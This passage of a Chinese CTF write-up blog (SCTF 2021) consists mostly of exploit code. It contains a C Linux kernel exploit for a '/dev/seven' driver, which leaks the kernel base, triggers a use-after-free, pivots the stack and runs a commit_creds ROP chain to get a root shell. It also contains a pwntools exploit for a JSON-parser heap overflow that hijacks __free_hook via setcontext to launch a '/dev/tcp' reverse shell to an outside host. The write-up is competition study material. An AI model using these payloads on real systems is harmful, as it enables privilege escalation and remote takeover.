      char* rsp;</span><br><span class="line"></span><br><span class="line">        unsigned long ss;</span><br><span class="line"></span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line">struct trap_frame tf;</span><br><span class="line"></span><br><span class="line">void save_state(void)&#123;</span><br><span class="line"></span><br><span class="line">        asm volatile(   &quot;mov tf+8, cs;&quot;</span><br><span class="line"></span><br><span class="line">                        &quot;pushf;&quot;</span><br><span class="line"></span><br><span class="line">                        &quot;pop tf+16;&quot;</span><br><span class="line"></span><br><span class="line">                        &quot;mov tf+24, rsp;&quot;</span><br><span class="line"></span><br><span class="line">                        &quot;mov tf+32, ss;&quot;</span><br><span class="line"></span><br><span class="line">                        );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void open_target(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        fd = open(&quot;/dev/seven&quot;, O_RDWR);</span><br><span class="line"></span><br><span class="line">        assert(fd &gt; 0);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int lock;</span><br><span class="line"></span><br><span class="line">void *memset_buf(void *tmp)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        unsigned long buf[4];</span><br><span class="line"></span><br><span class="line">        for(int i = 0; i &lt; 4; i++)&#123;</span><br><span class="line"></span><br><span class="line">                buf[i] = (unsigned long)tmp;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line"></span><br><span class="line">        char buf[0x81];</span><br><span class="line"></span><br><span class="line">        memset(buf, &#x27;M&#x27;, 0x80);</span><br><span class="line"></span><br><span class="line">        */</span><br><span class="line"></span><br><span class="line">        lock = 1;</span><br><span class="line"></span><br><span class="line">        while(1)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">                write(fd, buf, 0x20);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return tmp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void shell(void)&#123;</span><br><span class="line"></span><br><span class="line">        char* argv[] = &#123;&quot;/bin/sh&quot;, NULL&#125;;</span><br><span class="line"></span><br><span class="line">        execve(argv[0], argv, NULL);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void setup_chunk_rop(unsigned long kernel_base)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        unsigned long *rop;</span><br><span class="line"></span><br><span class="line">        int i = (0x1000000/2)/8;</span><br><span class="line"></span><br><span class="line">        unsigned long commit_creds = kernel_base + (0xffffffff8108c360 - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        unsigned long prepare_kernel_cred = kernel_base + (0xffffffff8108c780 - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        unsigned long pop_rdi = kernel_base + 0x16e9;</span><br><span class="line"></span><br><span class="line">        unsigned long mov_rdi_rax = kernel_base + (0xffffffff813d7369 - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        unsigned long mov_rdi_rax_rep = kernel_base + (0xffffffff81aed04b - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        unsigned long pop_rcx = kernel_base + (0xffffffff8101ed83 - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        unsigned long mov_cr3_rdi = kernel_base + (0xffffffff8105734a -0xffffffff81000000); //: mov cr3, rdi ; ret</span><br><span class="line"></span><br><span class="line">        unsigned long or_rax_rdx = kernel_base + (0xffffffff81018d2c -0xffffffff81000000); //: or rax, rdx ; ret</span><br><span class="line"></span><br><span class="line">        unsigned long pop_rdx = kernel_base + (0xffffffff8104abb7-0xffffffff81000000); // pop rdx; ret</span><br><span class="line"></span><br><span class="line">        unsigned long pop_rax = kernel_base + (0xffffffff8100ec67-0xffffffff81000000); // pop rax; ret</span><br><span class="line"></span><br><span class="line">        unsigned long mov_rax_cr3 = kernel_base + (0xffffffff81057fab-0xffffffff81000000); //: mov rax, cr3 ; mov cr3, rax ; ret</span><br><span class="line"></span><br><span class="line">        unsigned long mov_cr3_rax = kernel_base + (0xffffffff81057fae - 0xffffffff81000000);//: mov cr3, rax ; ret</span><br><span class="line"></span><br><span class="line">        unsigned long swapgs = kernel_base + (0xffffffff81c00f58 - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        unsigned long iretq = kernel_base + (0xffffffff81024f92 - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        unsigned long swapgs_restore = kernel_base + (0xffffffff81c00e26 - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line"></span><br><span class="line">                   0xffffffff816e19bc:        mov    esp,0x83000000</span><br><span class="line"></span><br><span class="line">                   0xffffffff816e19c1:        ret </span><br><span class="line"></span><br><span class="line">        */</span><br><span class="line"></span><br><span class="line">        unsigned long pivot = kernel_base + 0x6e19bc;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        rop = mmap(0x83000000-(0x1000000/2), 0x1000000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 0x4 + (0x1000000/2)/8;)</span><br><span class="line"></span><br><span class="line">                rop[i++] = 0xffffffff816e19bc;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //rop[i++] = mov_rax_cr3;</span><br><span class="line"></span><br><span class="line">        //rop[i++] = pop_rdx;</span><br><span class="line"></span><br><span class="line">        //rop[i++] = 0x1000;</span><br><span class="line"></span><br><span class="line">        //rop[i++] = or_rax_rdx;</span><br><span class="line"></span><br><span class="line">        //rop[i++] = mov_cr3_rax;</span><br><span class="line"></span><br><span class="line">        rop[i++] = pop_rdi;</span><br><span class="line"></span><br><span class="line">        rop[i++] = 0;</span><br><span class="line"></span><br><span class="line">        rop[i++] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">        rop[i++] = pop_rcx;</span><br><span class="line"></span><br><span class="line">        rop[i++] = 0;</span><br><span class="line"></span><br><span class="line">        rop[i++] = mov_rdi_rax_rep;</span><br><span class="line"></span><br><span class="line">        rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">        rop[i++] = swapgs_restore;</span><br><span class="line"></span><br><span class="line">        rop[i++] = 0;</span><br><span class="line"></span><br><span class="line">        rop[i++] = 0;</span><br><span class="line"></span><br><span class="line">        rop[i++] = shell;</span><br><span class="line"></span><br><span class="line">        rop[i++] = tf.cs;</span><br><span class="line"></span><br><span class="line">        rop[i++] = tf.rflags;</span><br><span class="line"></span><br><span class="line">        rop[i++] = tf.rsp;</span><br><span class="line"></span><br><span class="line">        rop[i++] = tf.ss;</span><br><span class="line"></span><br><span class="line">        rop[i++] = kernel_base +( 0xffffffff816e19bc - 0xffffffff81000000);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        printf(&quot;ROP fake stack %p\n&quot;, rop);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// When testing when being already root.</span><br><span class="line"></span><br><span class="line">unsigned long get_text_base(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        char b[0x10000];</span><br><span class="line"></span><br><span class="line">        char *p;</span><br><span class="line"></span><br><span class="line">        int ret;</span><br><span class="line"></span><br><span class="line">        unsigned long leak;</span><br><span class="line"></span><br><span class="line">        int kmsg = open(&quot;/dev/kmsg&quot;, O_RDONLY);</span><br><span class="line"></span><br><span class="line">        assert(kmsg &gt; 0);</span><br><span class="line"></span><br><span class="line">        ret = read(kmsg, b, 0x10000);</span><br><span class="line"></span><br><span class="line">        assert(ret &gt; 0);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        p = strchr(b, 0xff);</span><br><span class="line"></span><br><span class="line">        leak = strtoul(p+1, NULL, 10);</span><br><span class="line"></span><br><span class="line">        leak -= 0x1f3ecd;</span><br><span class="line"></span><br><span class="line">        return leak;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        char buf[0x81];</span><br><span class="line"></span><br><span class="line">        int ret;</span><br><span class="line"></span><br><span class="line">        unsigned long kernel_base;</span><br><span class="line"></span><br><span class="line">        save_state();</span><br><span class="line"></span><br><span class="line">        // open the target device driver.</span><br><span class="line"></span><br><span class="line">        open_target();</span><br><span class="line"></span><br><span class="line">        ret = ioctl(fd, ALLOC, 0x80);</span><br><span class="line"></span><br><span class="line">        assert(ret == 0);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //memset(buf, &#x27;M&#x27;, 0x80);</span><br><span class="line"></span><br><span class="line">        strcpy(buf, &quot;data : %lld %lld %lld %lld %lld \xff%lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld\n&quot;);</span><br><span class="line"></span><br><span class="line">        ret = write(fd, buf, 0x80);</span><br><span class="line"></span><br><span class="line">        assert(ret &gt; 0);</span><br><span class="line"></span><br><span class="line">        // Trying to printk that data we wrote.</span><br><span class="line"></span><br><span class="line">        ret = ioctl(fd, GET, 0);</span><br><span class="line"></span><br><span class="line">        assert(ret == 0);</span><br><span class="line"></span><br><span class="line">        // trying to have the text base!</span><br><span class="line"></span><br><span class="line">        if (argc == 1)</span><br><span class="line"></span><br><span class="line">                exit(1);</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line"></span><br><span class="line">                kernel_base = strtoul(argv[1], NULL, 16) - 0x1f3ecd;</span><br><span class="line"></span><br><span class="line">        //kernel_base = get_text_base();</span><br><span class="line"></span><br><span class="line">        printf(&quot;Kernel base %lx\n&quot;, kernel_base);</span><br><span class="line"></span><br><span class="line">        setup_chunk_rop(kernel_base);</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        // trying to fill that freed chunk with struct subprocess_info</span><br><span class="line"></span><br><span class="line">        // Trying to bruteforce it.</span><br><span class="line"></span><br><span class="line">        //sleep(0.1);</span><br><span class="line"></span><br><span class="line">        // Trying to free our chunk for UAD</span><br><span class="line"></span><br><span class="line">        ret = ioctl(fd, UAF, 0);</span><br><span class="line"></span><br><span class="line">        assert(ret == 0);</span><br><span class="line"></span><br><span class="line">        pthread_t tid;</span><br><span class="line"></span><br><span class="line">        pthread_create(&amp;tid, NULL, memset_buf, kernel_base + 0x6e19bc);</span><br><span class="line"></span><br><span class="line">        sleep(0.3);</span><br><span class="line"></span><br><span class="line">        for(int i = 0; i &lt; 0x1; i++)</span><br><span class="line"></span><br><span class="line">                ret = socket(22, AF_INET, 0);</span><br><span class="line"></span><br><span class="line">        //write(fd, buf, 0x20);</span><br><span class="line"></span><br><span class="line">        sleep(0.3);</span><br><span class="line"></span><br><span class="line">        lock = 0;</span><br><span class="line"></span><br><span class="line">        //printf(&quot;socket returned %d\n&quot;, ret);</span><br><span class="line"></span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="christmas-wishes">Christmas Wishes</span><a href="#christmas-wishes" class="header-anchor"></a></h3><p>漏洞点在parser_string中没有考虑转义&quot;的情况 导致堆溢出</p>
<p>字符串中不能写\x00的问题用\u0000绕过 同理可以用hex_parse写任何不可见字符</p>
<p>控制tcache fd为free_hook后用setcontext rop反弹shell出来即可执行gift</p>
<p>远程可先使用readflag读”&#x2F;proc&#x2F;self&#x2F;maps” 泄露libc地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_php</span>(<span class="params">buf</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pwn.php&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line"></span><br><span class="line">        pf.write(<span class="string">b&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$data = jsonparser(&quot;%s&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">readfile($data);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;&#x27;&#x27;&#x27;</span>%buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_php2</span>(<span class="params">buf</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pwnjson&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line"></span><br><span class="line">        pf.write(<span class="string">b&#x27;&#x27;&#x27;%s&#x27;&#x27;&#x27;</span>%buf)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pp64</span>(<span class="params">num</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">rb&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"></span><br><span class="line">        payload += <span class="string">rb&quot;\\u&quot;</span> </span><br><span class="line"></span><br><span class="line">        tmp = <span class="built_in">bytes</span>(<span class="built_in">hex</span>((((num &amp; <span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>) + ((num &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)) &amp; <span class="number">0xffff</span>)[<span class="number">2</span>:],encoding=<span class="string">&#x27;utf8&#x27;</span>).rjust(<span class="number">4</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload += tmp</span><br><span class="line"></span><br><span class="line">        num = num &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(pp64(0x1234))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pp64 = lambda x  : p64(x)[:6] + rb&quot;\\u0000&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = 0x7ffff7474000</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x7faea6b33000</span></span><br><span class="line"></span><br><span class="line">rdx_gadget = libc_base + <span class="number">0x000000000012c050</span></span><br><span class="line"></span><br><span class="line">rdi_ret = libc_base + <span class="number">0x0000000000026796</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000002535f</span> + libc_base</span><br><span class="line"></span><br><span class="line">rsi_ret = <span class="number">0x000000000002890f</span> + libc_base </span><br><span class="line"></span><br><span class="line">rdx_ret = <span class="number">0x00000000000cb1cd</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x555556606000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># heap_base = 0x555556606000 + 0x1E1600</span></span><br><span class="line"></span><br><span class="line">heap_base = <span class="number">0x56400792d000</span>+ <span class="number">0x1E1600</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">shell_addr = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]+ <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">frame.rip = ret</span><br><span class="line"></span><br><span class="line">frame.rsp = heap_base + <span class="number">0x640</span> + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(unpack_many(<span class="built_in">bytes</span>(frame)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">rb&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;bb\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;aa\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;cc\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;dd\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;ee\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;ff\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;gg\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;ff\&quot;:\&quot;aaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;ee\&quot;:\&quot;aaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;dd\&quot;:\&quot;aaaaaa\&quot;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;zz\&quot;:\&quot;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\\\&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&quot;b&quot;</span> * <span class="number">6</span> + pp64(<span class="number">0x51</span>) + pp64(<span class="number">0</span>) * <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += pp64(0x31) + pp64(0) * 3</span></span><br><span class="line"></span><br><span class="line">payload += pp64(<span class="number">0x31</span>) + pp64(free_hook - <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += b&#x27;b&#x27; * (0x80-2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x7ffff7635e70)[:6]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += rb&quot;\\u0000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x7ffff7635e70)[:6]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += rb&quot;\\u0000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x7ffff7635e70)[:6]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += rb&quot;\\u0000&quot;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&#x27;\&quot;,&#x27;</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">rb&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;address\&quot;:\&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&#x27;a&#x27;</span> *<span class="number">0x20</span> + <span class="string">rb&#x27;\&quot;,&#x27;</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">rb&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;rop\&quot;:\&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">rop = pp64(rdi_ret) + pp64(shell_addr)  + pp64(rsi_ret) + pp64(<span class="number">0</span>) + pp64(rdx_ret) + pp64(<span class="number">0</span>)+ pp64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += pp64(<span class="number">0</span>) + pp64(heap_base + <span class="number">0x640</span> + <span class="number">0x10</span> - <span class="number">0xC0</span> + <span class="number">0x10</span>) + pp64(<span class="number">0</span>) * <span class="number">2</span>  +pp64(<span class="number">0</span>)*<span class="number">2</span> + pp64(libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base )</span><br><span class="line"></span><br><span class="line">payload += pp64(<span class="number">0</span>) * <span class="number">15</span> + pp64(heap_base + <span class="number">0x640</span> + <span class="number">0x108</span> - <span class="number">0xc0</span> + <span class="number">0x10</span>) + pp64(ret) + pp64(<span class="number">0</span>) + pp64(<span class="number">0x51</span>) + pp64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += rop + rb&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#x27;.replace(b&#x27; &#x27;,rb&#x27;\\u2020&#x27;).replace(b&quot;\&quot;&quot;,rb&#x27;\\u2022&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload += rop + <span class="string">rb&#x27;/bin/touch /ctf/work/asddd&#x27;</span>.replace(<span class="string">b&#x27; &#x27;</span>,<span class="string">rb&#x27;\\u2020&#x27;</span>).replace(<span class="string">b&quot;\&quot;&quot;</span>,<span class="string">rb&#x27;\\u2022&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&#x27;\&quot;,&#x27;</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">rb&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;rops\&quot;:\&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&#x27;a&#x27;</span>*<span class="number">0x8</span> + pp64(free_hook + <span class="number">0x10</span>) +<span class="string">rb&quot;\\\&quot;&quot;</span> + <span class="string">rb&quot;a&quot;</span>*(<span class="number">6</span>+<span class="number">8</span> + <span class="number">8</span>) +<span class="string">rb&#x27;a&#x27;</span> * <span class="number">8</span>+ pp64(rdx_gadget)  + pp64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base + <span class="number">0x10</span>) + pp64(<span class="number">0</span>) * <span class="number">2</span>  +pp64(<span class="number">0</span>)*<span class="number">2</span> + pp64(libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span> + libc_base ) </span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += bytes(frame)[0x28:].replace(b&#x27;\x00\x00&#x27;,rb&#x27;\\u0000&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload += pp64(<span class="number">0</span>) * <span class="number">15</span> + pp64(libc_base + <span class="number">0x1C1E70</span> + <span class="number">0x108</span>) + pp64(ret) + pp64(<span class="number">0</span>) + pp64(<span class="number">0x51</span>) + pp64(<span class="number">0</span>) * <span class="number">7</span> </span><br><span class="line"></span><br><span class="line">payload += rop + <span class="string">rb&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xx.xx.xx/9090 0&gt;&amp;1&quot;&#x27;</span>.replace(<span class="string">b&#x27; &#x27;</span>,<span class="string">rb&#x27;\\u2020&#x27;</span>).replace(<span class="string">b&quot;\&quot;&quot;</span>,<span class="string">rb&#x27;\\u2022&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&#x27;\&quot;,&#x27;</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">rb&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    \&quot;rops\&quot;:\&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&#x27;a&#x27;</span> *<span class="number">0x20</span> + <span class="string">rb&#x27;\&quot;,&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">rb&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create_php(payload.replace(rb&#x27;\&quot;&#x27;,rb&#x27;&quot;&#x27;))</span></span><br><span class="line"></span><br><span class="line">create_php(payload)</span><br><span class="line"></span><br><span class="line">create_php2(payload.replace(<span class="string">rb&#x27;\&quot;&#x27;</span>,<span class="string">rb&#x27;&quot;&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>然后将<code>pwnjson</code>里面的’\‘替换成’&#39; 复制到文本框中点击发送即可</p>
<p>web服务堆环境很乱 需要多次爆破尝试.</p>
<p><img src="../images/2021-12-25-SCTF/20211228082942015.jpg" alt="img"></p>
<p><img src="../images/2021-12-25-SCTF/20211228082941710.jpg" alt="img"></p>
<p>pwnjson如下:</p>
